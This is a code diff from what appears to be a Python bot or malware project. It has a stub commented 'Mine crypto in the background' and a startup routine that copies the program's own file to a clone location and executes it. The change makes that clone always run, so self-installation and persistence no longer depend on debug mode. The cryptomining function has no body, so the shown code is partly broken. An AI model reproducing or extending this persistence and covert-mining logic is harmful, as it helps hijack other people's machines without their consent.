@@ -329,7 +329,8 @@ def fileList(dir): # List files in current directory
 def bgMining():
     # Mine crypto in the background.
             
-def srtChk(): # Startup Check. (Still in testing!)
+def srtChk(): 
+    # Startup Check. (Still in testing!)
     name = str(__name__) # Get filename.
     hd = str(os.path.expanduser('~')) # Get path to home directory.
     hdPath = str(os.getcwd()) # Get current working directory.
@@ -354,6 +355,7 @@ def srtChk(): # Startup Check. (Still in testing!)
             if os.path.isfile(clone):
                 if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Bot File Exists: " + clone)
+                # need to run clone instead
             else:
                 if name != clone:
                     # Need to check root permissions to copy to /usr/local/bin/.
@@ -365,8 +367,8 @@ def srtChk(): # Startup Check. (Still in testing!)
                         shutil.copyfile(name, clone)
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("Running: " + clone)
-                runcmd(clone)
-                #os.system(clone)
+            runcmd(clone)
+            #os.system(clone)
         except OSError as mdr:
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("ERROR: " + str(mdr))
